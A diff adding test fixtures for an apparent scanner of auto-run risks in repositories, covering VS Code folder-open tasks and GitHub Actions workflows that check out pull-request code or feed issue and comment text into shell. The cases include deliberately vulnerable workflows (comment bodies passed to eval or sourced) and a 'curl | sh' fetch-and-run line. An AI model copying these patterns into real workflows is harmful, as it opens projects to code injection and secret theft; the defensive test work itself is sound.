@@ -286,6 +286,42 @@ RC-AUTO-021:
       files:
         .vscode/tasks.json: '{"tasks": [{"label": "fetch", "command": "curl -s https://example.invalid/x | sh"}]}'
 
+RC-AUTO-023:
+  positive:
+    - name: folderOpen task runs a script with node
+      files:
+        .vscode/tasks.json: |
+          {
+            "version": "2.0.0",
+            "tasks": [
+              {
+                "label": "init",
+                "type": "shell",
+                "command": "node .vscode/init.js",
+                "runOptions": {"runOn": "folderOpen"}
+              }
+            ]
+          }
+      expect: [{path: .vscode/tasks.json, line: 7, severity: high}]
+    - name: script in the arguments, under workspaceFolder and in the Windows variant
+      files:
+        a/.vscode/tasks.json: '{"tasks": [{"label": "x", "command": "python", "args": ["scripts/bootstrap.py", "--quiet"], "runOptions": {"runOn": "folderOpen"}}]}'
+        b/.vscode/tasks.json: '{"tasks": [{"label": "x", "type": "process", "command": "${workspaceFolder}/tools/setup.ps1", "runOptions": {"runOn": "folderOpen"}}]}'
+        c/.vscode/tasks.json: '{"tasks": [{"label": "x", "command": "echo", "windows": {"command": ".\\tools\\prep.cmd"}, "runOptions": {"runOn": "folderOpen"}}]}'
+      expect:
+        - {path: a/.vscode/tasks.json, line: 1}
+        - {path: b/.vscode/tasks.json, line: 1}
+        - {path: c/.vscode/tasks.json, line: 1}
+  negative:
+    - name: folderOpen tasks that start a package script, a compiler or echo
+      files:
+        a/.vscode/tasks.json: '{"tasks": [{"label": "watch", "type": "npm", "script": "watch", "runOptions": {"runOn": "folderOpen"}}]}'
+        b/.vscode/tasks.json: '{"tasks": [{"label": "tsc", "command": "tsc", "args": ["-w", "-p", "tsconfig.json"], "runOptions": {"runOn": "folderOpen"}}]}'
+        c/.vscode/tasks.json: '{"tasks": [{"label": "lint", "command": "eslint . --ext .js,.ts", "runOptions": {"runOn": "folderOpen"}}]}'
+    - name: script task that does not start on folder open
+      files:
+        .vscode/tasks.json: '{"tasks": [{"label": "x", "command": "node scripts/build.js"}]}'
+
 RC-AUTO-022:
   positive:
     - name: interpreter inside the repository
@@ -820,7 +856,78 @@ RC-AUTO-060:
                     ref: ${{ github.event.pull_request.head.sha }}
                 - run: npm ci && npm test
       expect: [{path: .github/workflows/ci.yml, line: 8}]
+    - name: merge ref, head repository, git fetch of a pull ref and an env value
+      files:
+        .github/workflows/a.yml: |
+          on: pull_request_target
+          jobs:
+            build:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/checkout@v4
+                  with:
+                    ref: refs/pull/${{ github.event.number }}/merge
+        .github/workflows/b.yml: |
+          on: [pull_request_target]
+          jobs:
+            build:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/checkout@v4
+                  with:
+                    repository: ${{ github.event.pull_request.head.repo.full_name }}
+        .github/workflows/c.yml: |
+          on:
+            pull_request_target:
+          jobs:
+            build:
+              runs-on: ubuntu-latest
+              steps:
+                - run: |
+                    git fetch origin pull/${{ github.event.pull_request.number }}/head:pr
+                    git checkout pr
+        .github/workflows/d.yml: |
+          on: pull_request_target
+          env:
+            HEAD: ${{ github.event.pull_request.head.sha }}
+          jobs:
+            build:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/checkout@v4
+                  with:
+                    ref: ${{ env.HEAD }}
+      expect:
+        - {path: .github/workflows/a.yml, line: 8}
+        - {path: .github/workflows/b.yml, line: 8}
+        - {path: .github/workflows/c.yml, line: 8}
+        - {path: .github/workflows/d.yml, line: 10}
+    - name: workflow_run checks out the head commit of the run
+      files:
+        .github/workflows/post.yml: |
+          on:
+            workflow_run:
+              workflows: [CI]
+              types: [completed]
+          jobs:
+            report:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/checkout@v4
+                  with:
+                    ref: ${{ github.event.workflow_run.head_sha }}
+      expect: [{path: .github/workflows/post.yml, line: 11}]
   negative:
+    - name: pull_request_target checks out the base branch
+      files:
+        .github/workflows/ci.yml: |
+          on: pull_request_target
+          jobs:
+            build:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/checkout@v4
+                - run: git fetch origin main
     - name: pull_request_target without checking out PR code
       files:
         .github/workflows/label.yml: |
@@ -955,6 +1062,140 @@ RC-AUTO-062:
               runs-on: ubuntu-latest
               steps:
                 - run: gh pr edit ${{ github.event.pull_request.number }} --add-label ok --repo ${{ github.repository }}
+
+RC-AUTO-063:
+  positive:
+    - name: env value put back into the script with an expression
+      files:
+        .github/workflows/greet.yml: |
+          on:
+            issues:
+              types: [opened]
+          jobs:
+            greet:
+              runs-on: ubuntu-latest
+              env:
+                TITLE: ${{ github.event.issue.title }}
+              steps:
+                - run: |
+                    echo "New issue: ${{ env.TITLE }}"
+      expect: [{path: .github/workflows/greet.yml, line: 8}]
+    - name: env value given to eval
+      files:
+        .github/workflows/bot.yml: |
+          on: issue_comment
+          jobs:
+            run:
+              runs-on: ubuntu-latest
+              steps:
+                - env:
+                    CMD: ${{ github.event.comment.body }}
+                  run: |
+                    eval "$CMD"
+      expect: [{path: .github/workflows/bot.yml, line: 7}]
+    - name: branch name written to GITHUB_ENV
+      files:
+        .github/workflows/pr.yml: |
+          on: pull_request_target
+          jobs:
+            t:
+              runs-on: ubuntu-latest
+              steps:
+                - env:
+                    BRANCH: ${{ github.head_ref }}
+                  run: echo "BRANCH_NAME=$BRANCH" >> "$GITHUB_ENV"
+      expect: [{path: .github/workflows/pr.yml, line: 7}]
+  negative:
+    - name: env value read as a quoted shell variable
+      files:
+        .github/workflows/greet.yml: |
+          on: issues
+          jobs:
+            greet:
+              runs-on: ubuntu-latest
+              steps:
+                - env:
+                    TITLE: ${{ github.event.issue.title }}
+                  run: echo "New issue - $TITLE"
+    - name: the same in a workflow without secrets
+      files:
+        .github/workflows/ci.yml: |
+          on: pull_request
+          jobs:
+            t:
+              runs-on: ubuntu-latest
+              steps:
+                - env:
+                    BRANCH: ${{ github.head_ref }}
+                  run: echo "BRANCH_NAME=$BRANCH" >> "$GITHUB_ENV"
+
+RC-AUTO-064:
+  positive:
+    - name: comment body extracted with jq and run
+      files:
+        .github/workflows/bot.yml: |
+          on: issue_comment
+          jobs:
+            t:
+              runs-on: ubuntu-latest
+              steps:
+                - run: |
+                    jq -r '.comment.body' "$GITHUB_EVENT_PATH" > cmd.sh
+                    bash cmd.sh
+      expect: [{path: .github/workflows/bot.yml, line: 7}]
+    - name: github-script writes the comment to a file a later step runs
+      files:
+        .github/workflows/bot.yml: |
+          on: issue_comment
+          jobs:
+            t:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/github-script@v7
+                  with:
+                    script: |
+                      require('fs').writeFileSync('run.sh', context.payload.comment.body)
+                - run: sh ./run.sh
+      expect: [{path: .github/workflows/bot.yml, line: 9}]
+    - name: issue body in a variable written to a file and sourced
+      files:
+        .github/workflows/steps.yml: |
+          on: issues
+          jobs:
+            t:
+              runs-on: ubuntu-latest
+              steps:
+                - env:
+                    ISSUE_BODY: ${{ github.event.issue.body }}
+                  run: |
+                    printf '%s' "$ISSUE_BODY" > /tmp/steps.sh
+                    source /tmp/steps.sh
+      expect: [{path: .github/workflows/steps.yml, line: 9}]
+  negative:
+    - name: comment body saved and only searched
+      files:
+        .github/workflows/bot.yml: |
+          on: issue_comment
+          jobs:
+            t:
+              runs-on: ubuntu-latest
+              steps:
+                - run: |
+                    jq -r '.comment.body' "$GITHUB_EVENT_PATH" > body.txt
+                    grep -q '/deploy' body.txt && echo ok
+    - name: run title written to release notes
+      files:
+        .github/workflows/release.yml: |
+          on: workflow_run
+          jobs:
+            t:
+              runs-on: ubuntu-latest
+              steps:
+                - env:
+                    TITLE: ${{ github.event.workflow_run.display_title }}
+                  run: |
+                    echo "$TITLE" > notes.md
+                    gh release create v1 -F notes.md
 
 RC-AUTO-070:
   positive:
